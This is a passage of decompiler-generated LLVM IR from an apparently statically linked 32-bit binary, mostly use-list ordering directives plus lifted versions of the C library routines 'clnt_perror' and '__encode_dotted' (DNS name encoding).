32, 4, 236, 17, 237, 238, 239, 240, 18, 241, 19, 467, 478, 468, 20, 243, 244, 148, 146, 147, 149, 21, 150, 22, 151, 152, 5, 23, 153, 154, 24, 245, 25, 246, 247, 26, 469, 27, 248, 249, 6, 250, 253, 128, 129, 251, 252, 254, 7, 255, 256, 94, 257, 95, 258, 97, 259, 96, 260, 98, 261, 117, 99, 262, 8, 273, 274, 275, 155, 65, 66, 33, 67, 156, 68, 69, 62, 63, 64, 157, 60, 61, 158, 58, 59, 159, 54, 55, 56, 57, 160, 161, 162, 276, 277, 280, 73, 70, 71, 72, 278, 279, 281, 284, 74, 75, 76, 282, 283, 285, 286, 118, 287, 130, 288, 289, 290, 291, 292, 34, 35, 293, 294, 295, 296, 297, 298, 299, 300, 307, 301, 302, 303, 304, 305, 306, 52, 100, 101, 131, 132, 102, 103, 104, 315, 316, 317, 163, 164, 165, 166, 167, 168, 133, 318, 105, 319, 320, 77, 321, 323, 324, 325, 322, 113, 326, 134, 327, 328, 329, 330, 331, 332, 106, 333, 334, 335, 9, 135, 336, 337, 338, 107, 339, 340, 78, 341, 36, 342, 79, 343, 108, 344, 345, 136, 346, 347, 37, 348, 109, 349, 137, 350, 351, 38, 352, 110, 353, 138, 355, 39, 356, 357, 358, 359, 360, 361, 362, 363, 111, 412, 112, 413, 141, 119 }
  uselistorder i32 15, { 7, 4, 15, 9, 3, 16, 17, 8, 33, 36, 6, 0, 24, 5, 10, 11, 12, 13, 14, 18, 19, 20, 21, 22, 23, 1, 25, 26, 2, 27, 28, 29, 30, 31, 32, 34, 35 }
  uselistorder i32 14, { 6, 0, 10, 11, 12, 13, 2, 8, 3, 7, 4, 1, 9, 5 }
  uselistorder i32 13, { 4, 2, 1, 6, 5, 3, 7, 0, 8, 9 }
  uselistorder i32 12, { 73, 7, 281, 282, 262, 263, 264, 0, 265, 43, 117, 44, 45, 285, 82, 202, 203, 204, 205, 266, 113, 8, 307, 308, 286, 309, 310, 311, 312, 313, 314, 61, 60, 15, 268, 16, 17, 18, 19, 20, 21, 22, 9, 114, 115, 116, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 287, 5, 283, 284, 118, 119, 122, 46, 123, 120, 121, 124, 23, 24, 125, 126, 47, 127, 48, 128, 129, 49, 130, 50, 131, 51, 132, 52, 133, 134, 135, 288, 136, 75, 137, 99, 25, 26, 27, 101, 28, 29, 102, 30, 31, 100, 289, 290, 291, 62, 76, 77, 57, 53, 138, 139, 140, 267, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 338, 173, 174, 141, 142, 175, 176, 177, 74, 206, 207, 208, 209, 210, 143, 278, 279, 144, 145, 349, 350, 351, 352, 353, 354, 355, 341, 342, 343, 344, 345, 346, 347, 348, 315, 333, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 63, 332, 64, 146, 10, 58, 147, 148, 149, 269, 270, 271, 272, 150, 56, 244, 103, 104, 105, 106, 107, 108, 109, 110, 111, 367, 11, 273, 303, 1, 2, 304, 305, 32, 33, 306, 3, 274, 275, 65, 71, 178, 179, 180, 181, 182, 159, 151, 366, 152, 339, 363, 153, 280, 337, 154, 12, 13, 14, 340, 335, 336, 334, 356, 357, 358, 155, 156, 157, 368, 66, 72, 359, 360, 361, 362, 364, 6, 365, 54, 158, 160, 112, 161, 162, 55, 78, 79, 80, 81, 164, 163, 4, 67, 68, 165, 166, 167, 168, 169, 170, 171, 172, 34, 183, 37, 36, 35, 184, 38, 185, 40, 39, 186, 187, 188, 189, 190, 191, 59, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 211, 212, 213, 215, 216, 217, 214, 218, 219, 220, 221, 222, 223, 224, 225, 226, 253, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 41, 238, 239, 240, 42, 241, 242, 243, 245, 246, 247, 248, 249, 250, 251, 252, 254, 255, 256, 257, 258, 69, 259, 260, 261, 276, 277, 70 }
  uselistorder i32 11, { 13, 28, 29, 9, 32, 10, 15, 1, 5, 8, 25, 14, 33, 11, 4, 22, 2, 30, 31, 0, 6, 12, 23, 24, 7, 16, 26, 17, 18, 19, 20, 21, 3, 27 }
  uselistorder i32 10, { 46, 37, 4, 83, 84, 85, 86, 87, 88, 38, 5, 89, 48, 55, 30, 90, 24, 23, 39, 6, 43, 69, 70, 47, 81, 91, 40, 7, 63, 64, 41, 45, 31, 8, 19, 9, 65, 66, 68, 67, 10, 20, 25, 22, 56, 12, 13, 21, 57, 11, 58, 59, 14, 60, 61, 15, 62, 2, 3, 27, 28, 1, 16, 0, 17, 29, 35, 26, 71, 49, 50, 51, 52, 53, 54, 36, 32, 72, 73, 33, 18, 74, 75, 42, 76, 79, 77, 34, 78, 80, 82, 44 }
  uselistorder i32 9, { 11, 32, 33, 34, 35, 0, 1, 13, 6, 37, 38, 36, 3, 12, 2, 8, 7, 17, 39, 40, 41, 42, 22, 18, 43, 19, 20, 5, 9, 21, 4, 14, 15, 16, 23, 24, 25, 26, 27, 28, 30, 29, 10, 31 }
  uselistorder i32 7, { 13, 29, 30, 0, 1, 27, 21, 14, 7, 2, 8, 22, 23, 24, 25, 26, 4, 15, 32, 33, 34, 35, 9, 16, 5, 6, 28, 10, 17, 18, 19, 20, 3, 11, 31, 12 }
  uselistorder i32 6, { 25, 44, 45, 30, 31, 2, 32, 3, 28, 18, 46, 47, 0, 9, 26, 23, 24, 19, 50, 4, 5, 8, 29, 48, 49, 6, 1, 7, 33, 10, 11, 27, 20, 21, 34, 22, 35, 12, 13, 14, 36, 37, 15, 38, 41, 39, 40, 16, 17, 42, 43 }
  uselistorder i32 5, { 31, 44, 34, 41, 42, 43, 8, 9, 45, 38, 39, 15, 32, 10, 36, 37, 16, 11, 33, 23, 24, 40, 25, 0, 47, 48, 26, 17, 1, 2, 3, 4, 12, 46, 18, 13, 14, 35, 5, 6, 7, 19, 20, 21, 27, 28, 22, 29, 30 }
  uselistorder i32 3, { 95, 118, 119, 120, 121, 122, 123, 30, 12, 13, 129, 14, 109, 110, 15, 124, 48, 17, 16, 7, 31, 111, 96, 49, 104, 105, 127, 128, 46, 50, 8, 51, 93, 32, 56, 114, 97, 0, 57, 58, 59, 60, 61, 62, 130, 33, 34, 63, 45, 112, 113, 52, 4, 5, 3, 53, 9, 1, 29, 106, 107, 10, 108, 28, 19, 20, 18, 21, 22, 23, 24, 25, 54, 125, 55, 126, 26, 27, 64, 35, 36, 65, 2, 66, 37, 98, 38, 39, 6, 40, 67, 68, 69, 70, 71, 101, 102, 103, 115, 116, 41, 72, 73, 74, 75, 99, 76, 47, 77, 94, 78, 79, 80, 42, 81, 117, 82, 83, 84, 85, 86, 87, 43, 88, 89, 44, 90, 100, 91, 92, 11 }
  uselistorder i32 (i8*, i32)* @strcpy, { 0, 1, 8, 3, 4, 5, 6, 7, 9, 10, 11, 2, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 22, 23 }
  uselistorder i32 (i32)* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @sprintf, { 26, 28, 25, 27, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 8, { 24, 133, 129, 192, 174, 191, 359, 358, 360, 25, 26, 361, 362, 363, 364, 365, 366, 2, 367, 182, 194, 309, 310, 311, 3, 312, 313, 368, 369, 99, 403, 431, 432, 433, 434, 435, 436, 437, 438, 102, 37, 38, 39, 40, 103, 41, 42, 43, 104, 44, 105, 45, 106, 107, 175, 176, 177, 178, 131, 179, 180, 181, 204, 393, 394, 183, 184, 185, 186, 187, 4, 188, 189, 190, 193, 440, 195, 46, 47, 196, 439, 197, 198, 199, 200, 201, 202, 203, 395, 85, 205, 206, 396, 397, 207, 208, 209, 210, 134, 211, 212, 398, 142, 48, 49, 143, 50, 51, 108, 52, 144, 53, 54, 145, 146, 399, 400, 401, 402, 135, 100, 147, 148, 149, 213, 214, 370, 404, 405, 406, 407, 408, 409, 101, 410, 411, 371, 412, 475, 476, 276, 277, 278, 279, 280, 281, 282, 283, 517, 86, 518, 87, 130, 314, 315, 316, 477, 55, 215, 389, 390, 216, 217, 496, 497, 498, 499, 500, 501, 502, 5, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 6, 441, 442, 443, 444, 445, 446, 110, 7, 111, 8, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 109, 464, 465, 9, 466, 467, 468, 469, 10, 470, 218, 56, 27, 28, 219, 220, 29, 372, 373, 30, 31, 13, 342, 343, 150, 151, 153, 154, 152, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 88, 11, 170, 171, 344, 515, 374, 375, 376, 308, 32, 33, 132, 413, 414, 415, 416, 418, 419, 420, 417, 421, 422, 423, 424, 57, 58, 425, 426, 427, 428, 429, 430, 34, 478, 479, 480, 377, 378, 379, 380, 264, 265, 381, 284, 285, 286, 287, 510, 247, 352, 89, 511, 512, 513, 514, 221, 222, 223, 224, 481, 482, 483, 508, 509, 392, 225, 226, 474, 228, 229, 172, 471, 472, 473, 391, 227, 230, 485, 503, 231, 232, 233, 234, 235, 353, 516, 236, 237, 506, 507, 238, 239, 240, 241, 242, 504, 243, 484, 244, 245, 246, 249, 250, 251, 252, 248, 253, 136, 137, 138, 139, 140, 254, 255, 505, 173, 256, 59, 35, 112, 113, 114, 115, 116, 117, 60, 118, 119, 90, 257, 258, 259, 260, 261, 91, 262, 263, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 92, 0, 61, 62, 63, 64, 65, 288, 72, 71, 70, 69, 66, 67, 68, 141, 120, 289, 93, 290, 291, 73, 97, 74, 292, 293, 22, 94, 294, 76, 75, 98, 77, 295, 296, 121, 23, 95, 297, 1, 298, 299, 300, 301, 14, 302, 15, 16, 122, 96, 303, 12, 304, 305, 306, 307, 78, 79, 317, 318, 319, 321, 320, 322, 323, 324, 325, 326, 17, 327, 328, 329, 350, 330, 36, 331, 332, 333, 80, 123, 81, 334, 335, 18, 336, 337, 338, 82, 124, 83, 339, 340, 341, 125, 345, 19, 346, 347, 348, 20, 349, 351, 21, 84, 354, 355, 126, 356, 357, 127, 382, 383, 384, 385, 128, 386, 387, 388 }
  uselistorder i32 4, { 275, 420, 368, 746, 747, 683, 684, 685, 679, 677, 678, 680, 681, 682, 78, 6, 686, 687, 688, 689, 690, 691, 692, 693, 694, 108, 421, 422, 748, 749, 176, 405, 321, 7, 8, 425, 618, 9, 10, 11, 564, 565, 566, 567, 568, 569, 12, 570, 571, 572, 573, 13, 14, 15, 16, 17, 772, 773, 774, 775, 776, 777, 18, 369, 370, 755, 756, 574, 811, 195, 812, 813, 814, 815, 816, 817, 818, 19, 820, 819, 651, 695, 696, 697, 698, 699, 700, 204, 701, 706, 707, 708, 210, 109, 709, 710, 711, 712, 110, 111, 112, 211, 113, 114, 115, 116, 714, 117, 715, 212, 118, 213, 214, 371, 372, 373, 374, 375, 376, 377, 378, 322, 79, 323, 80, 324, 81, 325, 82, 757, 379, 68, 750, 751, 752, 753, 177, 20, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 761, 762, 763, 402, 403, 404, 758, 759, 760, 406, 407, 408, 409, 410, 411, 412, 413, 427, 414, 415, 416, 21, 417, 418, 419, 423, 424, 822, 426, 428, 429, 119, 120, 430, 821, 754, 431, 432, 433, 434, 764, 765, 435, 436, 437, 438, 439, 440, 276, 441, 766, 767, 768, 121, 122, 326, 327, 328, 83, 329, 123, 330, 124, 215, 125, 126, 331, 127, 332, 333, 334, 335, 769, 770, 178, 270, 771, 284, 283, 285, 286, 287, 196, 442, 443, 444, 445, 446, 447, 823, 22, 703, 704, 705, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 197, 788, 851, 702, 789, 523, 524, 448, 525, 526, 527, 528, 854, 855, 0, 894, 895, 896, 856, 179, 277, 652, 654, 575, 576, 577, 579, 578, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 655, 656, 657, 658, 857, 23, 449, 450, 451, 452, 453, 216, 733, 734, 735, 205, 736, 737, 738, 739, 454, 455, 456, 457, 458, 206, 24, 459, 460, 864, 889, 867, 874, 875, 876, 877, 878, 25, 868, 869, 870, 871, 872, 1, 873, 865, 866, 824, 26, 825, 191, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 69, 846, 847, 849, 848, 27, 890, 888, 653, 217, 461, 462, 463, 464, 84, 85, 128, 465, 86, 716, 717, 180, 718, 719, 720, 721, 87, 28, 88, 466, 467, 468, 129, 130, 131, 713, 181, 89, 631, 628, 629, 630, 192, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 351, 349, 350, 91, 353, 352, 90, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 893, 29, 132, 722, 502, 790, 30, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 133, 134, 279, 92, 808, 809, 810, 723, 31, 724, 198, 271, 725, 510, 511, 512, 199, 200, 93, 513, 514, 726, 727, 529, 530, 531, 532, 533, 488, 659, 860, 861, 32, 33, 34, 891, 892, 469, 470, 471, 858, 859, 887, 740, 742, 741, 472, 850, 879, 182, 473, 474, 183, 475, 476, 477, 94, 95, 743, 96, 489, 478, 885, 886, 479, 480, 481, 482, 483, 218, 484, 880, 881, 883, 882, 884, 485, 486, 853, 852, 364, 487, 862, 863, 365, 366, 97, 490, 491, 744, 492, 493, 288, 289, 35, 290, 291, 292, 293, 294, 295, 296, 297, 298, 36, 299, 278, 98, 494, 495, 496, 99, 100, 101, 102, 103, 136, 137, 135, 138, 139, 497, 37, 498, 38, 39, 40, 41, 499, 219, 220, 221, 265, 42, 500, 222, 223, 224, 140, 501, 225, 226, 503, 504, 505, 2, 184, 185, 43, 44, 506, 227, 507, 508, 509, 515, 228, 516, 229, 517, 518, 519, 520, 3, 141, 142, 143, 230, 144, 521, 522, 231, 145, 146, 232, 147, 148, 534, 535, 233, 536, 537, 236, 300, 301, 237, 302, 303, 161, 238, 304, 305, 306, 239, 307, 308, 309, 235, 310, 311, 160, 158, 159, 312, 313, 157, 314, 155, 156, 315, 316, 154, 152, 317, 153, 318, 272, 319, 149, 320, 150, 151, 234, 538, 61, 539, 540, 45, 46, 541, 542, 162, 543, 273, 544, 193, 545, 163, 201, 546, 165, 240, 164, 547, 274, 548, 194, 549, 166, 202, 241, 550, 186, 5, 47, 551, 70, 552, 203, 207, 208, 242, 243, 244, 245, 62, 246, 247, 63, 248, 249, 187, 553, 554, 555, 556, 557, 558, 559, 560, 590, 561, 48, 562, 563, 49, 167, 168, 4, 105, 106, 104, 169, 250, 50, 591, 251, 51, 71, 170, 592, 593, 594, 252, 253, 254, 596, 597, 598, 595, 599, 600, 601, 52, 602, 603, 604, 605, 72, 53, 606, 54, 55, 255, 607, 73, 608, 609, 610, 280, 612, 611, 188, 613, 614, 615, 616, 645, 107, 256, 257, 617, 171, 172, 619, 258, 259, 260, 261, 64, 262, 263, 264, 620, 621, 622, 173, 174, 623, 624, 625, 626, 627, 632, 56, 65, 633, 74, 634, 635, 636, 281, 638, 637, 189, 639, 640, 57, 66, 641, 75, 642, 643, 644, 282, 647, 646, 190, 648, 649, 650, 209, 58, 67, 175, 660, 76, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 266, 673, 674, 675, 267, 676, 728, 268, 729, 730, 731, 269, 732, 77, 59, 745, 60, 367 }
  uselistorder i32* @ebp, { 53, 54, 30, 4, 31, 32, 33, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 47, 5, 48, 49, 381, 382, 383, 413, 384, 385, 386, 199, 200, 414, 415, 416, 417, 268, 269, 275, 276, 277, 278, 288, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 366, 367, 368, 369, 370, 371, 63, 64, 50, 51, 52, 55, 56, 57, 418, 419, 420, 58, 59, 60, 6, 61, 62, 25, 26, 372, 373, 374, 375, 376, 377, 378, 379, 380, 387, 388, 389, 390, 391, 392, 435, 436, 437, 438, 439, 440, 463, 232, 233, 234, 201, 202, 203, 204, 65, 66, 67, 68, 69, 353, 354, 441, 447, 448, 449, 450, 442, 443, 444, 445, 446, 421, 422, 423, 424, 425, 426, 427, 428, 433, 429, 430, 431, 432, 2, 434, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 92, 93, 94, 95, 96, 97, 98, 99, 3, 100, 279, 280, 281, 286, 282, 283, 284, 285, 287, 224, 225, 226, 227, 7, 228, 229, 393, 8, 394, 395, 396, 397, 398, 399, 191, 192, 9, 193, 196, 194, 195, 14, 197, 198, 270, 1, 271, 272, 273, 274, 300, 301, 302, 303, 304, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 0, 412, 27, 28, 29, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 318, 317, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 359, 360, 361, 135, 333, 334, 335, 101, 102, 103, 104, 105, 106, 107, 118, 235, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 458, 459, 460, 461, 462, 451, 452, 453, 10, 454, 455, 119, 120, 121, 355, 356, 357, 358, 15, 16, 17, 18, 19, 20, 21, 22, 23, 122, 456, 457, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 11, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 24, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 205, 208, 209, 206, 207, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 230, 231, 221, 222, 223, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 336, 337, 338, 339, 340, 341, 342, 343, 344, 12, 345, 346, 347, 348, 13, 349, 350, 351, 352, 362, 363, 364, 365 }
  uselistorder label %dec_label_pc_8067593, { 1, 0 }
  uselistorder label %dec_label_pc_806758a, { 14, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_8067587, { 1, 0 }
  uselistorder label %dec_label_pc_806757f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8067507, { 1, 0 }
  uselistorder label %dec_label_pc_80674f6, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_806759e = load i32, i32* @ebx, align 4
  %v0_80675a2 = load i8*, i8** @global_var_8073d70, align 4
  %v1_80675a2 = ptrtoint i8* %v0_80675a2 to i32
  store i32 %v1_80675a2, i32* @ebx, align 4
  %v3_80675b0 = call i32 @__GI_clnt_sperror(i32 %arg1, i32 %arg2)
  %v0_80675b5 = load i32, i32* @ebx, align 4
  store i32 %v0_806759e, i32* @ebx, align 4
  %v3_80675c1 = call i32 @__GI_fputs(i32 %v3_80675b0, i32 %v0_80675b5)
  ret i32 %v3_80675c1

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fputs, { 6, 5, 4, 3, 1, 2, 0 }
  uselistorder i8** @global_var_8073d70, { 10, 9, 8, 0, 7, 6, 5, 4, 3, 2, 1 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80675c9 = load i32, i32* @edi, align 4
  %v0_80675ca = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80675d1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80675d1, i32* @edi, align 4
  %v1_80676306 = icmp eq i8* %arg1, null
  br i1 %v1_80676306, label %dec_label_pc_8067639, label %dec_label_pc_8067634.lr.ph

dec_label_pc_8067634.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8067634

dec_label_pc_80675d7:                             ; preds = %dec_label_pc_8067634
  %v5_80675dc = call i32 @__GI_strchr(i8* %v1_8067634, i32 46)
  %v1_80675e6 = icmp eq i32 %v5_80675dc, 0
  br i1 %v1_80675e6, label %dec_label_pc_80675f0, label %dec_label_pc_80675ea

dec_label_pc_80675ea:                             ; preds = %dec_label_pc_80675d7
  %v1_80675ec = load i32, i32* @edi, align 4
  %v2_80675ec = sub i32 %v5_80675dc, %v1_80675ec
  br label %dec_label_pc_80675fe

dec_label_pc_80675f0:                             ; preds = %dec_label_pc_80675d7
  %v0_80675f3 = load i32, i32* @edi, align 4
  %v5_80675f3 = inttoptr i32 %v0_80675f3 to i8*
  %v3_80675f4 = call i32 @strlen(i8* %v5_80675f3)
  br label %dec_label_pc_80675fe

dec_label_pc_80675fe:                             ; preds = %dec_label_pc_80675ea, %dec_label_pc_80675f0
  %v0_8067611 = phi i32 [ %v3_80675f4, %dec_label_pc_80675f0 ], [ %v2_80675ec, %dec_label_pc_80675ea ]
  store i32 %v0_8067611, i32* @esi, align 4
  %v1_80675fe = icmp eq i32 %v0_8067611, 0
  %v3_80675fe = trunc i32 %v0_8067611 to i8
  br i1 %v1_80675fe, label %dec_label_pc_806764d, label %dec_label_pc_8067602

dec_label_pc_8067602:                             ; preds = %dec_label_pc_80675fe
  %v1_8067606 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067606 = sub i32 %arg3, %v1_8067606
  %v1_8067608 = add i32 %v2_8067606, -1
  %v7_8067609 = icmp ult i32 %v0_8067611, %v1_8067608
  %v1_806760b = icmp eq i1 %v7_8067609, false
  br i1 %v1_806760b, label %dec_label_pc_806764d, label %dec_label_pc_806760d

dec_label_pc_806760d:                             ; preds = %dec_label_pc_8067602
  store i32 %arg2, i32* @edx, align 4
  %v4_8067613 = add i32 %v1_8067606, %arg2
  %v5_8067613 = inttoptr i32 %v4_8067613 to i8*
  store i8 %v3_80675fe, i8* %v5_8067613, align 1
  %v0_8067616 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067616 = add i32 %v0_8067616, 1
  %v0_8067618 = load i32, i32* @edx, align 4
  %v2_806761a = add i32 %v1_8067616, %v0_8067618
  %v0_806761c = load i32, i32* @esi, align 4
  %v0_806761d = load i32, i32* @edi, align 4
  %v2_806761f = add i32 %v0_806761c, %v1_8067616
  store i32 %v2_806761f, i32* %ebx.global-to-local, align 4
  %tmp31 = inttoptr i32 %v2_806761a to i16*
  %v7_8067621 = call i32 @memcpy(i16* %tmp31, i32 %v0_806761d, i32 %v0_806761c)
  %v1_806762d = add i32 %v5_80675dc, 1
  br i1 %v1_80675e6, label %dec_label_pc_8067639, label %dec_label_pc_8067630

dec_label_pc_8067630:                             ; preds = %dec_label_pc_806760d
  store i32 %v1_806762d, i32* @edi, align 4
  %v1_8067630 = icmp eq i32 %v1_806762d, 0
  br i1 %v1_8067630, label %dec_label_pc_8067639, label %dec_label_pc_8067634

dec_label_pc_8067634:                             ; preds = %dec_label_pc_8067634.lr.ph, %dec_label_pc_8067630
  %v0_80675db = phi i32 [ %v4_80675d1, %dec_label_pc_8067634.lr.ph ], [ %v1_806762d, %dec_label_pc_8067630 ]
  %v1_8067634 = inttoptr i32 %v0_80675db to i8*
  %v2_8067634 = load i8, i8* %v1_8067634, align 1
  %v3_8067634 = icmp eq i8 %v2_8067634, 0
  %v1_8067637 = icmp eq i1 %v3_8067634, false
  br i1 %v1_8067637, label %dec_label_pc_80675d7, label %dec_label_pc_8067639

dec_label_pc_8067639:                             ; preds = %dec_label_pc_8067630, %dec_label_pc_8067634, %dec_label_pc_806760d, %entry
  %tmp32 = icmp slt i32 %arg3, 1
  br i1 %tmp32, label %dec_label_pc_806764d, label %dec_label_pc_8067640

dec_label_pc_8067640:                             ; preds = %dec_label_pc_8067639
  %v1_8067644 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067644 = add i32 %v1_8067644, %arg2
  %v3_8067644 = inttoptr i32 %v2_8067644 to i8*
  store i8 0, i8* %v3_8067644, align 1
  %v0_8067648 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067648 = add i32 %v0_8067648, 1
  br label %dec_label_pc_8067650

dec_label_pc_806764d:                             ; preds = %dec_label_pc_8067602, %dec_label_pc_80675fe, %dec_label_pc_8067639
  br label %dec_label_pc_8067650

dec_label_pc_8067650:                             ; preds = %dec_label_pc_8067640, %dec_label_pc_806764d
  %storemerge4 = phi i32 [ %v1_8067648, %dec_label_pc_8067640 ], [ -1, %dec_label_pc_806764d ]
  store i32 %v0_80675ca, i32* @esi, align 4
  store i32 %v0_80675c9, i32* @edi, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i8* %v1_8067634, { 1, 0 }
  uselistorder i32 %v1_806762d, { 0, 2, 1 }
  uselistorder i32 %v0_806761c, { 1, 0 }
  uselistorder i1 %v1_80675e6, { 1, 0 }
  uselistorder i32 %v5_80675dc, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 38, 48, 49, 45, 46, 55, 56, 40, 41, 39, 3, 4, 15, 16, 17, 18, 19, 20, 21, 22, 23, 5, 6, 47, 0, 7, 24, 57, 50, 51, 32, 63, 25, 26, 27, 44, 42, 43, 8, 9, 10, 11, 12, 13, 62, 52, 53, 33, 54, 58, 59, 60, 28, 29, 30, 61, 14, 1, 2, 31, 34, 35, 36, 37 }
  uselistorder i32* @edx, { 313, 314, 86, 93, 5, 318, 316, 317, 4, 319, 320, 321, 322, 326, 327, 328, 329, 90, 91, 92, 96, 0, 97, 6, 26, 259, 226, 227, 228, 28, 27, 229, 230, 231, 232, 235, 236, 237, 238, 239, 240, 241, 233, 234, 388, 390, 391, 392, 393, 394, 395, 396, 89, 87, 88, 445, 9, 446, 284, 342, 330, 331, 332, 343, 345, 361, 362, 10, 323, 324, 325, 98, 94, 448, 95, 99, 100, 101, 102, 103, 104, 447, 105, 106, 107, 69, 70, 71, 7, 29, 397, 398, 333, 334, 11, 335, 336, 337, 399, 400, 401, 402, 403, 404, 405, 461, 462, 463, 464, 12, 465, 466, 346, 347, 196, 285, 444, 449, 1, 450, 467, 468, 516, 515, 469, 286, 242, 243, 244, 245, 246, 247, 248, 249, 250, 252, 251, 287, 13, 288, 289, 290, 291, 292, 293, 294, 295, 297, 298, 299, 300, 108, 479, 482, 14, 483, 480, 15, 481, 478, 451, 16, 452, 501, 363, 364, 366, 367, 368, 369, 17, 109, 113, 110, 111, 112, 348, 349, 350, 351, 352, 353, 354, 360, 355, 356, 357, 358, 359, 72, 73, 74, 3, 315, 365, 370, 406, 407, 371, 372, 18, 373, 338, 339, 340, 374, 375, 341, 408, 409, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 25, 427, 428, 410, 429, 19, 430, 431, 433, 20, 434, 435, 436, 437, 438, 439, 75, 21, 432, 440, 470, 22, 387, 177, 441, 442, 443, 197, 198, 484, 296, 385, 502, 503, 384, 173, 114, 116, 115, 117, 122, 118, 119, 120, 121, 344, 301, 477, 30, 504, 2, 202, 203, 389, 123, 505, 506, 514, 124, 125, 507, 508, 471, 472, 126, 454, 455, 456, 457, 460, 127, 128, 130, 131, 132, 133, 134, 135, 136, 76, 77, 453, 458, 459, 129, 137, 485, 495, 496, 138, 139, 78, 79, 302, 31, 146, 147, 148, 80, 500, 509, 510, 511, 512, 513, 497, 499, 23, 498, 486, 476, 473, 474, 475, 140, 141, 142, 143, 144, 145, 149, 150, 152, 153, 154, 156, 159, 160, 81, 82, 161, 157, 158, 151, 155, 162, 163, 164, 165, 166, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 24, 42, 172, 167, 170, 168, 169, 83, 171, 174, 487, 488, 489, 492, 493, 494, 84, 85, 490, 491, 517, 518, 175, 176, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 199, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 200, 201, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 220, 224, 219, 222, 223, 8, 221, 225, 253, 254, 255, 256, 257, 283, 258, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 376, 377, 378, 379, 380, 381, 382, 383, 386, 519 }
  uselistorder i32 (i8*)* @strlen, { 5, 25, 24, 14, 20, 19, 18, 17, 16, 11, 4, 15, 10, 9, 8, 7, 6, 13, 12, 23, 22, 0, 3, 2, 1, 21 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 5, 6, 1, 2, 3, 7, 0, 4 }
  uselistorder i32 46, { 2, 1, 4, 3, 0, 6, 5, 7 }
